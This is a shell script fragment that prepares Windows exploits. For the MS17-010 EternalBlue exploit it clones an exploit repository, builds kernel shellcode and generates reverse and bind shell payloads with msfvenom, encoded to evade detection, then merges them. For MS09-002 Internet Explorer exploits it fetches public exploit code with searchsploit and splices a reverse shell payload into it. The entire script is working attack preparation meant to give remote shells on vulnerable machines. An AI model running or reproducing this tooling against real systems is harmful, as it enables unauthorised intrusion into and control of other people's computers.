# MS17-010 - START
mkdir -p exploits_windows/smb/ms17-010
cd exploits_windows/smb/ms17-010

  git clone --depth=1 --recursive https://github.com/helviojunior/MS17-010.git .

  if [ ! -f ./shellcode/sc_all.bin ]; then
    nasm -f bin shellcode/eternalblue_kshellcode_x64.asm -o ./shellcode/sc_x64_kernel.bin
    msfvenom -p windows/x64/shell_reverse_tcp LPORT=$port_local LHOST=$ip_local EXITFUNC=thread --platform windows -a x64 --format raw -o ./shellcode/sc_x64_payload_rev.bin
    msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote --platform windows -a x64 --format raw -e x86/shikata_ga_nai -o ./shellcode/sc_x64_payload.bin
    cat ./shellcode/sc_x64_kernel.bin ./shellcode/sc_x64_payload.bin > ./shellcode/sc_x64.bin
    cat ./shellcode/sc_x64_kernel.bin ./shellcode/sc_x64_payload_rev.bin > ./shellcode/sc_x64_rev.bin

    nasm -f bin shellcode/eternalblue_kshellcode_x86.asm -o ./shellcode/sc_x86_kernel.bin
    msfvenom -p windows/shell_reverse_tcp LPORT=$port_local LHOST=$ip_local EXITFUNC=thread --platform windows -a x86 --format raw -e x86/shikata_ga_nai -o ./shellcode/sc_x86_payload_rev.bin
    msfvenom -p windows/shell_bind_tcp LPORT=$port_remote --platform windows -a x86 --format raw -e x86/shikata_ga_nai -o ./shellcode/sc_x86_payload.bin
    cat ./shellcode/sc_x86_kernel.bin ./shellcode/sc_x86_payload.bin > ./shellcode/sc_x86.bin
    cat ./shellcode/sc_x86_kernel.bin ./shellcode/sc_x86_payload_rev.bin > ./shellcode/sc_x86_rev.bin

    python ./shellcode/eternalblue_sc_merge.py ./shellcode/sc_x86.bin ./shellcode/sc_x64.bin ./shellcode/sc_all.bin
    python ./shellcode/eternalblue_sc_merge.py ./shellcode/sc_x86_rev.bin ./shellcode/sc_x64_rev.bin ./shellcode/sc_all_rev.bin
  fi
cd -
# MS17-010 - END

# MS09-002 - START
mkdir -p exploits_windows/ie/ms09-002
cd exploits_windows/ie/ms09-002

  if [ ! -f 8080_rev.py ]; then
    searchsploit -m 8080 
    js_le_payload=`cat ../../../payloads_windows/shell_reverse_tcp_x86.js_le`
    cp 8080.py 8080_rev.py
    sed -i "37s/.*/var c = unescape(\"$js_le_payload\");/" 8080_rev.py
  fi

  if [ ! -f 8152_rev.py ]; then
    searchsploit -m 8152
    cat 8152.py | head -n 17 > 8152_rev.py
    cat ../../../payloads_windows/shell_reverse_tcp_x86.js_le | sed "s/buf/payload/g" >> 8152_rev.py
    cat 8152.py | tail -n 102 >> 8152_rev.py
  fi

cd -
# MS09-002 - END
